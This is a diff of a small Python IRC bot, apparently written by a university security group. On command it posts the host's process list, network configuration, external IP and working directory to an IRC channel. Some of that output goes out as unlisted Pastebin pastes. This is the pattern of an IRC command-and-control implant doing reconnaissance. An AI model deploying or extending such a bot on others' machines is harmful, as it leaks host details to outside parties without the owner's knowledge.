@@ -2,8 +2,9 @@
 '''
 Name: sirpybot.py
 Description: IRC Bot
-Author: ISUSec Members -- Lopi, b0b, polacek, ducky
-Version: 0.1
+Author: Lopi
+Contributors: b0b (Windows stuffs)
+Version: 0.2
 '''
 # Libraries
 import socket # Communicate with irc server
@@ -27,7 +28,7 @@ parser.add_argument('nick', help='Nickname')
 args = parser.parse_args()
 
 # Global variables to configure the bot 
-pastebin_api_key = 'YOUR_KEY_HERE'    
+pastebin_api_key = 'INSERT_KEY_HERE'    
 server = args.server  # Server
 port = args.port    # Port
 channel = '#' + args.channel # Channel
@@ -77,13 +78,26 @@ def get_external_ip(): # Function to get external ip address
     sendmsg(channel, 'There was a problem with the URL: ' + e)
 
 def pslist(): # Function to list process names and pids
-  for proc in psutil.process_iter():
-    time.sleep(2)
-    sendmsg(channel, 'PID: ' + str(proc.pid) + ' | NAME: ' + proc.name)
+  if (str(platform.platform()))[0:3]=="Win":
+    for proc in psutil.process_iter():
+      time.sleep(2)
+      sendmsg(channel, 'PID: ' + str(proc.pid) + ' | NAME: ' + proc.name)
+  else:
+    p = subprocess.Popen(['ps', 'aux'], shell=False, stdout=subprocess.PIPE)
+    p.wait()
+    paste_code = p.stdout.read()
+    # TODO: Make this pretty
+    x = PastebinAPI()
+    url = x.paste(pastebin_api_key,
+                  paste_code,
+                  paste_name = 'ps aux', 
+                  paste_private = 'unlisted',
+                  paste_expire_date = '10M')
+    sendmsg(channel, url)
 
 def ifconfig():
   if (str(platform.platform()))[0:3]=="Win":
-    p = subprocess.Popen('ipconfig /all', shell = True, stdout=subprocess.PIPE)
+    p = subprocess.Popen('ipconfig /all', shell=False, stdout=subprocess.PIPE)
     p.wait()
     paste_code = p.stdout.read()
     x = PastebinAPI()
@@ -94,7 +108,7 @@ def ifconfig():
                   paste_expire_date = '10M')
     sendmsg(channel, url)
   else:
-    p = subprocess.Popen('ifconfig', shell = True, stdout=subprocess.PIPE)
+    p = subprocess.Popen('ifconfig', shell = False, stdout=subprocess.PIPE)
     p.wait()
     paste_code = p.stdout.read()
     x = PastebinAPI()
@@ -105,6 +119,9 @@ def ifconfig():
                   paste_expire_date = '10M')
 
     sendmsg(channel, url)
+
+def pwd(): # Print working directory
+  sendmsg(channel, os.getcwd())
 
 def sendmsg(chan , msg): # Function to send messages to the channel
   ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')
@@ -153,4 +170,7 @@ def main():
 
     if ircmsg.find(':ifconfig '+ botnick) != -1: # Calls pslist() if 'ifconfig BotName' is found
       ifconfig()
+
+    if ircmsg.find(':pwd '+ botnick) != -1: # Calls pwd() if 'pwd BotName' is found
+      pwd()
 main()
